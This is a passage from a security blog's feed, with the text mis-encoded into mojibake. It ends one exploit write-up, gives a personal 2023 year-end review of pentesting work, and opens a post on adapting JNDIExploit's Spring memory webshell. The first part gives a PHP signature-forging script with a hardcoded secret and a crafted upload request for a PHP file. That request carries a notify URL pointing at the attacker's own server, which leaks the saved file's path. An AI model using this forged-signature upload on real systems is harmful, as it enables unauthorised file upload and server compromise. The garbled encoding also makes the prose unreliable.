<p>è¿™ä¸ªå‡½æ•°æ„æ€å°±æ˜¯è°ƒç”¨äº† curlå»å¯¹ä¼ å…¥çš„ url å‘èµ·ä¸€æ¬¡è¯·æ±‚ï¼Œå¹¶å°†å“åº”çš„ç»“æœè¿”å›<br>
ä½†æ˜¯ä¼¼ä¹æˆ‘ä»¬è¿˜æ˜¯è·å–ä¸åˆ°è·¯å¾„ï¼Œè¿™é‡Œæˆ‘ä»¬å†å…³æ³¨ç¬¬äºŒä¸ªå‚æ•°<code>$param</code>ï¼Œå®ƒæ˜¯ç”±å‰é¢çš„<code>$info</code>ä¼ å…¥<br>
<img src="https://sl3epf.github.io/post-images/1704369997209.png" alt="" loading="lazy"><br>
è€Œ info åˆæ˜¯ upload_file çš„è¿”å›å€¼</p>
<pre><code class="language-php">// æ–‡ä»¶ä¿¡æ¯
        return [
            'name' =&gt; $file['name'],
            'ext' =&gt; $file_ext,
            'path' =&gt; $save_dir . $file_name .'.'. $file_ext,
            'size' =&gt; $size,
            'mime' =&gt; $mime_type
        ];
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ä»–çš„æ–‡ä»¶åè·¯å¾„ç­‰ä¿¡æ¯éƒ½åœ¨é‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ª url è®©ç¨‹åºå»è¯·æ±‚æˆ‘ä»¬çš„åœ°å€ï¼Œæˆ‘ä»¬å†çœ‹è¯·æ±‚çš„è®°å½•å°±èƒ½çœ‹åˆ°è·¯å¾„ä¿¡æ¯</p>
<h1 id="åˆ©ç”¨">åˆ©ç”¨</h1>
<p>å…ˆåœ¨ vps ä¸Šèµ·ä¸ªhttpæœåŠ¡<br>
ç„¶ååˆ©ç”¨ç­¾åè„šæœ¬ç”Ÿæˆç­¾å</p>
<pre><code class="language-php">&lt;?php
function sign_params($params): string
{
    // è¿‡æ»¤å‚æ•°
    $params = array_filter($params,function($key) use ($params){
        if(empty($params[$key]) || $key == 'sign'){
            return false;
        }
        return true;
    },ARRAY_FILTER_USE_KEY);

    // asciiæ’åº
    ksort($params);
    reset($params);
    var_dump($params);
    // ç­¾å
    //http_build_query($params) å°†å‚æ•°æ•°ç»„æ‹¼æ¥æˆ URL æŸ¥è¯¢å­—ç¬¦ä¸²ã€‚
    var_dump($params);
    var_dump(http_build_query($params));
    return md5(urldecode(http_build_query($params)) . &quot;asdasfasfasfasfasfa&quot;);
}

$_GET['md'] = &quot;upload&quot;;
$_GET['uid'] = &quot;3&quot;;
$_GET['notify'] = 'http://ip:port/';
echo sign_params($_GET);
</code></pre>
<p>ç„¶åæ„é€ è¯·æ±‚</p>
<pre><code class="language-html">POST /server/index.php?md=upload&amp;sign=ç­¾å&amp;uid=1&amp;notify=http://ip:port HTTP/2.0
Host:  xxxx
Content-Type: multipart/form-data; boundary=------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
Content-Length: 457

--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;

test

--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf\
</code></pre>
<p>å›åˆ°æœåŠ¡å™¨ä¸Šå°±èƒ½çœ‹åˆ°è¯·æ±‚<br>
<img src="https://sl3epf.github.io/post-images/1704370760018.png" alt="" loading="lazy"><br>
æˆåŠŸè®¿é—®<br>
<img src="https://sl3epf.github.io/post-images/1704370803067.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[2023å¹´ç»ˆæ€»ç»“]]></title>
        <id>https://sl3epf.github.io/post/q0RqVX7zC/</id>
        <link href="https://sl3epf.github.io/post/q0RqVX7zC/">
        </link>
        <updated>2023-12-31T15:59:59.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="å‰è¨€">å‰è¨€</h1>
<p>ä»£ç è°ƒçš„æœ‰ç‚¹å¤´æ™•äº†ï¼Œå†çœ‹ä¸‹å»ä¸ç¤¼è²Œäº†ã€‚æƒ³æƒ³ä»Šå¹´å°±æœ€åä¸¤ä¸‰å¤©äº†ï¼Œä¹Ÿå‡†å¤‡æ”¾å…ƒæ—¦å‡äº†ï¼Œè¶ç€è¿™ä¸ªæ—¶é—´æ¥å†™ä¸€ä¸‹ä»Šå¹´çš„ä¸€äº›äº‹æƒ…æƒ³æ³•ã€‚ç½‘æ˜“äº‘ï¼Œå¯åŠ¨ï¼</p>
<h1 id="è‡ªå·±å¦‚ä½•çœ‹å¾…è‡ªå·±">è‡ªå·±å¦‚ä½•çœ‹å¾…è‡ªå·±</h1>
<p>ä»Šå¹´ç¡®å®æ˜¯æˆé•¿å¾ˆå¤§çš„ä¸€å¹´ï¼Œå…ˆä¸è¯´æŠ€æœ¯æ–¹é¢ï¼Œè¿™ä¸ªåé¢å†™ã€‚<br>
ç»å†äº†å¾ˆå¤šäº‹æƒ…ï¼Œä¹Ÿè®¤è¯†äº†å¾ˆå¤šå¸ˆå‚…æœ‹å‹ï¼Œæ¯”èµ·ä»¥å‰è‡ªå·±ä¸€ç›´é—­é—¨é€ è½¦å¥½å¤šäº†ã€‚åœˆå­è¿™ä¸ªä¸œè¥¿ç¡®å®å¾ˆé‡è¦ï¼Œä¸€ä¸ªå¥½çš„æœ‹å‹åœˆï¼Œå¢é•¿è‡ªå·±è§è¯†ï¼Œä¹Ÿèƒ½å¤šäº¤æµå‡ºæƒ³æ³•ï¼Œåšé¡¹ç›®å¾ˆå¤šæ—¶å€™å°±æ˜¯å’Œé˜Ÿå‹èŠå¤©èŠå‡ºæ€è·¯çš„ã€‚ç›¸è¾ƒäºå‰å‡ å¹´ï¼Œä»Šå¹´ä¹Ÿæ›´æ„¿æ„å‘è¨€äº†ã€‚<br>
åœ¨æ„Ÿæƒ…ä¸Šå§ï¼Œä»Šå¹´å€’æ˜¯æ²¡æœ‰èŠ±ä»€ä¹ˆå¿ƒæ€äº†ï¼ˆæ²¡å¯¹è±¡èƒ½èŠ±äº†ï¼‰ğŸ˜…ï¼Œæš‚æ—¶ä¹Ÿæ²¡é‡åˆ°ç‰¹åˆ«æœ‰æ„Ÿè§‰çš„äººï¼Œæœ‰æ—¶å€™è§‰å¾—ä¸€ä¸ªäººä¹ŸæŒºå¥½ï¼Œä½†æ˜¯é‡åˆ°çš„æ—¶å€™è¯¥æŠŠæ¡è¿˜æ˜¯å¾—æŠŠæ¡ä½ã€‚<br>
ä»Šå¹´çš„å¿ƒæ€ä¹Ÿæ”¾çš„æ¯”è¾ƒå¹³äº†ï¼Œå…¶å®æ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„ç”Ÿæ´»ï¼Œä¹Ÿæ²¡å¿…è¦è€æ˜¯å’Œåˆ«äººæ¯”è¾ƒå•¥çš„ã€‚ç¾¡æ…•å½’ç¾¡æ…•ï¼Œçœ‹çœ‹å¾—äº†ï¼Œä¸è¦è‡ªæˆ‘å†…è€—ï¼Œæ²¡å•¥æ„ä¹‰ã€‚è‡ªå·±è§‰å¾—è¿‡çš„å¼€å¿ƒå°±å¥½äº†ï¼Œä¸€å®¶äººå¹³å®‰å¼€å¿ƒï¼Œä¸å°±æœ€å¥½äº†å—ã€‚</p>
<h1 id="ä»Šå¹´åšäº†å“ªäº›äº‹æƒ…">ä»Šå¹´åšäº†å“ªäº›äº‹æƒ…</h1>
<p>çœ‹åˆ°è¿™ä¸ªæ ‡é¢˜ï¼Œè„‘å­é‡Œå°±æ”¾å›å¿†å½•ä¸€æ ·çš„ã€‚äº‹æƒ…ç¡®å®å¤šï¼Œä»Šå¹´è¿‡å¾—ä¹Ÿç¡®å®å¿«ï¼Œæ„Ÿè§‰ä¸Šæ¬¡å†™æ€»ç»“è¿˜æ˜¯åœ¨æ˜¨å¤©ğŸ˜°<br>
è®°æµæ°´è´¦è¿˜æ˜¯åƒè€æœ¬äº†ã€‚</p>
<h2 id="ä¸€æœˆ">ä¸€æœˆ</h2>
<p>å»å¹´åäºŒæœˆå¤šå°±æ”¾å‡äº†ï¼Œæ‰€ä»¥ä¸€æœˆå·²ç»åœ¨å®¶é‡Œèººç€äº†ã€‚mdğŸ‘äº†æ˜¯çœŸéš¾å—å•Šã€‚<br>
é‚£æ®µæ—¶é—´åœ¨å®¶é‡Œåšè¯¾è®¾ï¼Œåé¢åˆå¼€å§‹å­¦ä¹ äº†golangï¼Œå¸®å¿™ç»™å›¢é˜Ÿå½•ä¸‹è¯¾ã€‚<br>
æ¯å¤©æ—©é¥­å¿…çœ‹æœ¨é±¼è§£è¯´çš„æ°´æµ’ä¼ ï¼Œä½†æ˜¯è²Œä¼¼ç°åœ¨è¿˜æ²¡çœ‹å®Œã€‚å¼€å¼€å¿ƒå¿ƒè¿‡å®Œå¹´ï¼Œåˆè¦å‡†å¤‡å¼€å­¦äº†ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703852496332.JPG" alt="" loading="lazy"></p>
<h2 id="äºŒ-ä¸‰æœˆ">äºŒã€ä¸‰æœˆ</h2>
<p>åˆšå›å­¦æ ¡è¿™ä¸¤æœˆç¡®å®æ²¡å•¥å¤ªå¤šäº‹ï¼Œå°±å¼€å§‹è¡¥å»å¹´çš„æœŸæœ«è€ƒè¯•ï¼Œå¹³æ—¶å°±å†™å†™ä»£ç ï¼Œæ„Ÿè§‰è¿™ä¸ªæœˆä¸€ç›´åœ¨æå¼€å‘å»äº†ï¼Œå½“æ—¶åˆç”¨goå†™äº†ä¸€äº›åƒåœ¾ç³»ç»Ÿå’Œå·¥å…·ã€‚æ¥ç€åˆå’Œä¸€ä¸ªå¸ˆå‚…ä¸€èµ·æŒ–äº†ä¸‹srcï¼Œæäº†ç‚¹é’±ï¼Œåƒé¥­åƒæ²¡äº†ã€‚æ‰“æ‰“çƒï¼Œä¸Šä¸Šè¯¾ï¼Œè¿™ä¸ªæ—¶å€™è¿˜æ˜¯æ²¡ä»€ä¹ˆäº‹æƒ…ã€‚</p>
<h2 id="å››æœˆ">å››æœˆ</h2>
<p>åˆ°è¿™ä¸ªæ—¶å€™å°±é™†é™†ç»­ç»­å¼€å§‹æœ‰é¡¹ç›®äº†ï¼Œå…ˆæ˜¯æœ‰ä¸€æ®µæ—¶é—´çš„è¿œç¨‹æ¸—é€æµ‹è¯•ï¼Œç›®æ ‡ç»™çš„çœŸçš„å¤ªå°äº†ï¼Œæ‰“ç‚¹æ‰“äº†å¥½ä¹…æ²¡å•¥ç‰¹åˆ«æœ‰ä»·å€¼çš„ä¸œè¥¿ï¼Œåé¢æ‰¾å®¢æˆ·è¦äº†ä¸ªvpnï¼Œæ‰å¥½æ‰“ä¸€äº›ã€‚åé¢é™ªè€æ¿å‡ºä¸ªå·®ï¼Œå»æ— é”¡ç©äº†å‡ å¤©ï¼Œè¿˜æ˜¯æŒºå®‰é™çš„æ„Ÿè§‰ï¼Œåœ°é“éƒ½æ²¡å•¥äººï¼Œï¼ˆå¯èƒ½æ˜¯æˆ‘æ²¡å»å•†ä¸šåŒºåˆæ˜¯å·¥ä½œæ—¥ï¼Ÿï¼‰ï¼Œç»¿åŒ–çœŸæ™®åŠæ„Ÿè§‰ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703853444685.JPG" alt="" loading="lazy"><br>
<img src="https://sl3epf.github.io/post-images/1703853527234.png" alt="" loading="lazy"><br>
è¿˜æœ‰ä¸€ä»¶äº‹å°±æ˜¯æ­£å¼æŠŠå­¦æ ¡çš„å›¢é˜Ÿæ‹‰èµ·æ¥äº†ï¼Œä¹Ÿè¿›è¡Œäº†ç¬¬ä¸€æ¬¡çš„æ‹›æ–°èµ›ï¼Œè™½ç„¶æœ‰ç‚¹ä»“ä¿ƒï¼Œä¹Ÿä¸å¤ªæ­£å¼ï¼Œä½†æ˜¯åé¢ä¼šæ…¢æ…¢å˜å¥½çš„ã€‚è¿™ä¹Ÿæ˜¯åœ¨é«˜ä¸­å°±æœ‰çš„ä¸€ä¸ªæƒ³æ³•ã€‚åœ¨ä»Šå¹´ä¹Ÿç®—æ˜¯å®Œæˆäº†ã€‚</p>
<h2 id="äº”æœˆ">äº”æœˆ</h2>
<p>æœ¬æ¥æ˜¯è¦å»ä¸ªå¸‚æŠ¤ï¼Œä½†æ˜¯é¢å®Œé‚£è¾¹è¯´å¹´çºªå¤ªå°äº†ï¼Œå®¢æˆ·è¦æ¯•ä¸šçš„ã€‚åé¢å°±åˆè¢«å«å»æ‰“äº†ä¸€ä¸ªå†›åŒºçš„æ¯”èµ›ï¼Œç›´æ¥æ–­ç½‘å››å°æ—¶ï¼Œæ¯”èµ›ä¹Ÿæ²¡æå‰å‘Šè¯‰æˆ‘æ˜¯è¦å¹²å•¥ï¼Œæ‰“CTFè¿˜æ˜¯æµ‹è¯•ç›®æ ‡ï¼Œå•¥ä¹Ÿæ²¡è¯´å°±æŠŠäººå–Šè¿‡å»ï¼Œæˆ‘çº¯åç‰¢ã€‚æ–­ç½‘æŸ¥ä¸äº†èµ„æ–™ï¼Œæˆ‘ç”µè„‘æœ‰äº›å·¥å…·è¿˜æ²¡æœ‰ï¼Œä¸€ä¸ªäººè¿˜å¾—åšäº”ä¸ªæ–¹å‘ï¼Œä¸€ä¸ªwebğŸ¶ä¼šä¸ªğŸ”ã€‚<br>
ä¸­æ—¬çš„æ—¶å€™å»äº†æ‰“äº†ä¸ªè¡Œä¸šæŠ¤ç½‘ï¼ŒåŠä¸ªæœˆã€‚è€æ¿ç»™å«äº†ä¸ªè“é«˜çš„å¤§å“¥ä¸€èµ·ï¼Œå¤§å“¥äººå¾ˆå¥½ï¼Œå¯¹æˆ‘å¤šæœ‰ç…§é¡¾ï¼Œä»ä¸­ä¹Ÿå­¦åˆ°äº†å¾ˆå¤šä¹‹å‰éƒ½æ²¡æ¥è§¦è¿‡çš„çŸ¥è¯†ã€‚å‰ä¸€æ®µæ—¶é—´å¹³å®‰åº¦è¿‡ï¼Œçº¢é˜Ÿæ²¡æ‘¸åˆ°è¿™è¾¹æ¥ï¼Œåé¢ä¸¤ä¸ªäººè¿˜éƒ½ğŸ‘äº†ï¼ˆæˆ‘åˆğŸ‘äº†ã€‚ã€‚ã€‚ï¼‰å¸¦ç—…ä¸Šç­ï¼Œåé¢å°±åœ¨å®¾é¦†è¿œç¨‹äº†ï¼Œåœ¨æœ€åä¸¤ä¸‰å¤©çš„æŸä¸ªä¸‹åˆï¼Œçªç„¶ä¸€æ¡å¼±å£ä»¤ç™»å½•æˆåŠŸçš„å‘Šè­¦+æ–‡ä»¶ä¸Šä¼ å‡ºç°åœ¨æˆ‘çœ¼å‰ï¼Œç«‹åˆ»å±•å¼€åˆ†æï¼Œç¬¬äºŒå¤©ä¹Ÿæ˜¯ç›´æ¥è¢«é¢†å¯¼å«å›å»äº†ï¼ŒğŸ‘çš„ä¹Ÿå·®ä¸å¤šäº†ï¼Œæœ€ååˆ†ææ˜¯ä¸€ä¸ªè¢«é—æ¼çš„ç«™ï¼Œè¢«ctæ‰“äº†ä¸ªå†…å­˜é©¬ï¼Œä¸¤ä¸ªäººç´¯æ­»ç´¯æ´»ï¼Œå•¥æ´»éƒ½è¦å¹²ï¼Œæ²¡æƒ³åˆ°æœ€å¿™çš„æ˜¯æœ€åä¸€ä¸¤å¤©ã€‚</p>
<h2 id="å…­æœˆ">å…­æœˆ</h2>
<p>å›å­¦æ ¡åˆè¦å‡†å¤‡æœŸæœ«å’Œè¯¾è®¾äº†ï¼Œå’Œå‡ ä¸ªå¤§å“¥åƒäº†é¡¿é¥­ï¼Œå­¦åˆ°äº†å¾ˆå¤šæŠ€æœ¯ä»¥å¤–çš„ä¸œè¥¿ã€‚<br>
å’Œæœ‹å‹å»é•¿æ²™ç©äº†ä¸€è¶Ÿï¼Œä¹‹å‰ä¸€ç›´å¾€é•¿æ²™è·‘ï¼Œä½†æ˜¯éƒ½æ²¡å¥½å¥½ç©è¿‡ã€‚<br>
å¿«åˆ°æœˆåº•çš„æ—¶å€™åˆæœ‰ä¸ªå•ä½çš„æ¸—é€ï¼Œä¸ºå›½æŠ¤æå‰å‡†å¤‡å‡†å¤‡ï¼Œè¿˜æœ‰å‡ ä½å¤§å‚çš„çº¢é˜Ÿå¸ˆå‚…ï¼Œæå‰æ¼”ç»ƒä¸€ä¸‹ã€‚å•ä½è®¾å¤‡ä¸Šäº†æŒºå¤šçš„ï¼Œç›´æ¥æ¨¡æ‹Ÿé’“é±¼ä¸Šä¸ªğŸå­ï¼Œè™½ç„¶èƒ½æ‹¿ä¸‹ä¸€äº›æœºå™¨ï¼Œä½†æ˜¯åŸŸæ§è¿˜æ˜¯æ‰“ä¸åŠ¨ï¼Œä¹Ÿæ˜¯å­¦åˆ°äº†ä¸€äº›å§¿åŠ¿ã€‚</p>
<h2 id="ä¸ƒæœˆ">ä¸ƒæœˆ</h2>
<p>æ¸—é€ + ä¸€ä¸ªæ— äººæœºçš„appï¼Œä¹Ÿæ˜¯æåˆ°æ— äººæœºæ¥ç©äº†ä¸‹ï¼Œä¸è¿‡å¥½åƒä»æ˜å¹´å¼€å§‹æœ‰æ–°è§„äº†ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703856935405.jpeg" alt="" loading="lazy"><br>
å›æ¥æ²¡å‘†å‡ å¤©ï¼Œåˆæ¥åˆ°é€šçŸ¥ï¼Œæå‰è¿‡å»ç»™å®¢æˆ·åŸ¹è®­ï¼Œé¡ºå¸¦åšä¸‹å›½æŠ¤çš„æ’æŸ¥ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703857633492.png" alt="" loading="lazy"><br>
åœ¨ä¸Šæµ·ä¹Ÿå‘ç°äº†ä¸€å®¶æŒºä¾¿å®œçš„çƒ§çƒ¤åº—ï¼Œåˆšå¥½ä¹Ÿåœ¨æˆ‘ä½çš„é™„è¿‘ï¼Œç¾ç¾åƒäº†å‡ é¡¿ã€‚<br>
å¤§æ¦‚åŸ¹è®­äº†æœ‰ä¸€å‘¨å¤šï¼Œæ¯å¤©éƒ½æ„Ÿè§‰æŒºæŠ˜ç£¨çš„ï¼Œä¸»è¦éƒ½ä¸æ˜¯ææŠ€æœ¯çš„ï¼Œè®²äº†ä¹Ÿæ²¡å•¥äººå¬ï¼Œä½†æ˜¯å¤§å®¶éƒ½æ˜¯ä¸ºäº†ä»»åŠ¡è€Œæ¥çš„ã€‚é‚£æ®µæ—¶é—´å¤©å¤©åœ¨å®¾é¦†ç©é€†æ°´å¯’ï¼Œå‘¨æœ«å°±åœ¨å®¾é¦†èººå°¸äº†ï¼Œç‚¹å¤–å–èººä¸€å¤©ã€‚ã€‚ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703857960201.JPG" alt="" loading="lazy"></p>
<h2 id="å…«æœˆ">å…«æœˆ</h2>
<p>åŸ¹è®­ç»“æŸåˆšå¥½åé¢ä¸¤å¤©å°±å›½æŠ¤å¼€å§‹äº†ï¼Œå®Œç¾çš„è¡”æ¥ã€‚<br>
å›½æŠ¤å•ä½æŒºå¹³é™çš„ï¼ŒåŸºæœ¬ä¸Šè€è€å®å®ååäº”å¤©ã€‚ç”²æ–¹ä»Šå¹´é›¶é£Ÿéƒ½æ²¡å¤šå°‘...åªèƒ½å¤šç‚«ä¸€ç‚¹é£Ÿå ‚çš„èœäº†ã€‚<br>
å¹²å®Œä»Šå¹´çš„æ´»åŸºæœ¬ä¸Šä¹Ÿå·®ä¸å¤šäº†ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703858349750.png" alt="" loading="lazy"></p>
<h2 id="ä¹æœˆ">ä¹æœˆ</h2>
<p>ä¹æœˆåˆå¼€å­¦äº†ï¼Œæœ‰äº›é¡¹ç›®çš„æ¬¾ç»“äº†ä¸€éƒ¨åˆ†ï¼Œç»™è‡ªå·±æ¢äº†å°ç”µè„‘ã€‚å°é»„é±¼è¿˜æ˜¯æœ‰æŒºå¤šå¥½ä¸œè¥¿çš„ã€‚16å¯¸çš„macç¡®å®èˆ’æœå¤šäº†ã€‚<br>
æœ¬æ¥ä»¥ä¸ºå¯ä»¥ä¼‘æ¯ä¸‹ï¼Œè¿™è¾¹çš„çœæŠ¤åˆæ¥äº†ã€‚äºæ˜¯ä¹åˆè¯·äº†åŠä¸ªæœˆå‡æ‰“çœæŠ¤å»äº†ï¼Œç›´æ¥è¯·åˆ°å›½åº†èŠ‚ï¼Œæ”¾äº†äºŒåå¤šå¤©å‡ï¼ˆå½“ç„¶çº¢é˜Ÿåç‰¢ä¸ç®—æ”¾å‡ï¼‰ï¼Œgaä¼™é£ŸçœŸä¸è¡Œï¼Œå¤©å¤©åƒç›’é¥­ï¼Œä½çš„åœ°æ–¹è¿˜è¦è‡ªå·±æ‰¾<br>
<img src="https://sl3epf.github.io/post-images/1703858716381.JPG" alt="" loading="lazy"><br>
çœæŠ¤ç“œè¿˜æŒºå¤šçš„ï¼Œä¸‹æ¬¡è¯•è¯•è¿‘æºå˜»å˜»</p>
<h2 id="åæœˆ">åæœˆ</h2>
<p>æ”¾å®Œå›½åº†å›æ¥ï¼Œè€å¸ˆé€šçŸ¥åˆå«æˆ‘ä»¬å»æ‰“ä¸ªå¸‚æŠ¤ã€‚æˆæœè¿˜ä¸é”™ï¼Œçªçªçªäº†ä¸€äº›å†…ç½‘ï¼Œæœ€åä¹Ÿæ˜¯æ‹¿äº†ä¸ªç¬¬ä¸‰ï¼Œå¹¸ä¸è¾±å‘½ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703859563887.JPG" alt="" loading="lazy"><br>
æ‰“å®Œè¿™ä¸ªæœˆä¹ŸåŸºæœ¬ä¸Šæ˜¯æ²¡äº†ï¼Œè¿™ä¸ªè¯¾æ˜¯ä¸Šä¸äº†ä¸€ç‚¹ã€‚ä¸€äº›è€å¸ˆéƒ½è¦ç»™æˆ‘æŒ‚ç§‘äº†...çœŸçš„éº»</p>
<h2 id="åä¸€æœˆ">åä¸€æœˆ</h2>
<p>å’Œæœ‹å‹å»æ­¦åŠŸå±±ç©äº†ä¸€è¶Ÿï¼ŒçœŸç‰¹ç§å…µï¼Œå¤œçˆ¬ï¼Œç­‰æ—¥å‡ºï¼Œç™½å¤©å†å¾’æ­¥ä¸‹å±±ã€‚çœŸçš„ç´¯ï¼Œè¿™è¾ˆå­ä¸æƒ³çˆ¬å±±äº†ï¼Œä½†æ˜¯é£æ™¯çœŸçš„ä¸é”™ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703860017503.png" alt="" loading="lazy"><br>
<img src="https://sl3epf.github.io/post-images/1703860023119.png" alt="" loading="lazy"><br>
æœˆåº•æ‰“äº†ä¸ªæ¹˜å†›æ¯ï¼Œ6ä¸ªå°æ—¶ï¼Œæ‹¿äº†ä¸ªç¬¬ä¸‰ï¼Œè¿˜æ˜¯èˆå¾—ç»™é’±çš„ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703860344781.png" alt="" loading="lazy"><br>
æ‰“å®Œå»æ´—ä¸ªè„šæŒ‰ä¸ªæ‘©ï¼Œèˆ’èˆ’æœæœã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703860422168.png" alt="" loading="lazy"></p>
<h2 id="åäºŒæœˆ">åäºŒæœˆ</h2>
<p>ä»Šå¹´å¤šäº†ä¸ªè®¡ç®—æœºç¨‹åºè®¾è®¡å¤§èµ›æ”»é˜²é‚€è¯·èµ›ï¼Œæ˜å¹´ä¼¼ä¹æ˜¯ç¬¬ä¸€å±Šï¼Œä»Šå¹´å¯èƒ½è¯•è¯•æ°´ã€‚<br>
ä¸è¿‡å¤šæä¸ªä¸€ç­‰å¥–è¿˜æ˜¯ä¸é”™çš„ï¼Œå­¦æ ¡ä¹ŸæŒºé‡è§†è¿™æ¯”èµ›ï¼Œæ‹¿å¥–+å…è´¹æ—…æ¸¸ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703860878722.jpg" alt="" loading="lazy"><br>
æ¯”èµ›æ‰“å®Œäº†ï¼Œé¡¹ç›®ä¹ŸåŸºæœ¬æ²¡æœ‰äº†ã€‚å¯èƒ½å°±å¹³å¸¸ä¸€ç‚¹æ¸—é€ï¼ŒæŒ–æ´æµ‹è¯•å•¥çš„ã€‚</p>
<h1 id="ä»Šå¹´çš„è¿›æ­¥">ä»Šå¹´çš„è¿›æ­¥</h1>
<p>ç®€å•å›é¡¾äº†ä¸€ä¸‹ä¸€æ•´å¹´çš„äº‹æƒ…ã€‚ä»Šå¹´åœ¨æŠ€æœ¯ä¸Šæ— ç–‘æ˜¯æˆé•¿äº†è®¸å¤šï¼Œåœ¨javaã€å†…ç½‘ã€åŒ…æ‹¬å¤–ç½‘æ‰“ç‚¹è¿˜æœ‰è“é˜Ÿç›¸å…³ç»éªŒéƒ½æ˜¯æœ‰å­¦åˆ°å¾ˆå¤šã€‚å½“ç„¶å¼€å‘æœ‰æå‡ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸å¤šï¼Œåªæ˜¯å¯¹ä¸šåŠ¡é€»è¾‘æ›´åŠ ç†Ÿæ‚‰äº†ï¼Œçœ‹åˆ°æœ‰äº›ç«™ï¼ŒåŸºæœ¬ä¸Šèƒ½çŒœåˆ°ä»£ç å¤§æ¦‚æ˜¯å’‹å†™çš„ã€‚<br>
ä¸è¿‡è¿˜æ˜¯å¾—å¤šèŠ±ç‚¹æ—¶é—´æ¥è€å¿ƒé’»ç ”æŠ€æœ¯ï¼Œå…¶å®å¾ˆå¤šé¡¹ç›®ä¸­ï¼Œèƒ½å­¦åˆ°ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†è¿˜æ˜¯åƒè€æœ¬ï¼Œä½†æ˜¯æ—¶é—´ä¹Ÿæ˜¯èŠ±äº†çš„ã€‚é¡¹ç›®æ¯”èµ›è¿˜æ˜¯ä¸€ä¸ªæ£€æµ‹è‡ªèº«å­¦ä¹ æˆæœçš„ä¸€ä¸ªä¸œè¥¿ï¼Œå­¦åˆ°çš„ä¸œè¥¿èƒ½ä¸èƒ½ç”¨ä¸Šï¼Œå®è·µä¼šå‡ºç»“æœã€‚</p>
<h1 id="flag">flag</h1>
<p>ä»£å®¡ï¼Œä¸»è¦æ˜¯Javaå®‰å…¨æ–¹é¢ï¼Œäº‰å–æŒ–èŒƒå›´å¹¿ä¸€ç‚¹çš„0dayã€‚<br>
å…æ€å’Œå†…ç½‘ä¹Ÿæ˜¯éœ€è¦é‡ç‚¹å­¦ä¹ çš„ï¼Œäº‰å–åœ¨ä¸€äº›å¯¹æŠ—çš„ç¯å¢ƒä¸‹æœ‰æ›´å¤§çš„çªç ´ï¼Œè¿˜æœ‰æ›´åŠ OPSECä¸€ç‚¹ï¼Œæ…¢æ…¢å¾€çº¢é˜Ÿæ–¹å‘é ã€‚<br>
ç»§ç»­èµšé’±(æ»¡çœ¼éƒ½æ˜¯ä¸–ä¿—çš„æ¬²æœ›ğŸ’°)<br>
å¤šè¯»ç‚¹ä¹¦ï¼Œæ„Ÿè§‰è‡ªå·±æ–‡åŒ–æ°´å¹³å¤ªä½äº†ï¼Œæœ‰æ—¶å€™ä¸€äº›è¯éƒ½ä¸ä¼šè¡¨è¾¾ã€‚åƒè¿™ç¯‡ä¸€æ ·ã€‚<br>
æ‰¾ä¸ªå¥³æœ‹å‹ï¼Ÿçœ‹ç¼˜åˆ†äº†è¦</p>
<h1 id="ç»“è¯­">ç»“è¯­</h1>
<p>æœ€åæå‰ç¥å¤§å®¶æ–°å¹´å¿«ä¹ã€‚<br>
æ˜å¹´å¥½å¥½å·ï¼Œè¦å»å®ä¹ äº†ï¼Œèº«ä»½ä¹Ÿè¦è½¬åŒ–ä¸€ä¸‹äº†ã€‚<br>
ä¸ç®¡æ€ä¹ˆæ ·ï¼Œè¿˜æ˜¯å¸Œæœ›åœ¨è‡ªå·±å–œæ¬¢çš„è¡Œä¸šæœ‰æ‰€æˆå°±ã€‚<br>
æ”¶æ”¶å¿ƒï¼Œç»§ç»­åŠ æ²¹ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[äºŒæ”¹JNDIExploitçš„Springå†…å­˜é©¬é€‚é…å†°è]]></title>
        <id>https://sl3epf.github.io/post/b_uiDGqEw/</id>
        <link href="https://sl3epf.github.io/post/b_uiDGqEw/">
        </link>
        <updated>2023-12-30T05:30:05.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="å‰è¨€">å‰è¨€</h1>
<p>æˆ‘ä»¬çŸ¥é“https://github.com/WhiteHSBG/JNDIExploit å·¥å…·æ³¨å…¥çš„å†°èå†…å­˜é©¬æ˜¯ç»è¿‡æ”¹é€ åçš„å†°èï¼Œç½‘ä¸Šå¹¶æ²¡æœ‰æ”¹é€ å¥½çš„ä¸ä¹‹é€‚é…çš„å†°èå®¢æˆ·ç«¯æ”¾å‡ºæ¥ï¼ŒåŸç‰ˆçš„å†°èæ˜¯è¿æ¥ä¸ä¸Šçš„ã€‚<br>
ä¸å…¶å»äºŒæ”¹å†°èçš„å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬ä¸å¦‚ç›´æ¥æ”¹è¿™ä¸ªjndiå·¥å…·ã€‚</p>
<h1 id="æ¼æ´ç¯å¢ƒ">æ¼æ´ç¯å¢ƒ</h1>
<p>https://github.com/j3ers3/Hello-Java-Sec<br>
è¿™ä¸ªä»£ç å®¡è®¡ç¯å¢ƒä¸­çš„jndiæ³¨å…¥æ¨¡å—ã€‚</p>
<h1 id="åˆ†æ">åˆ†æ</h1>
<p>æˆ‘ä»¬å…ˆç”¨åŸå·¥å…·é€»è¾‘å»æ‰“Springçš„å†°èå†…å­˜é©¬<br>
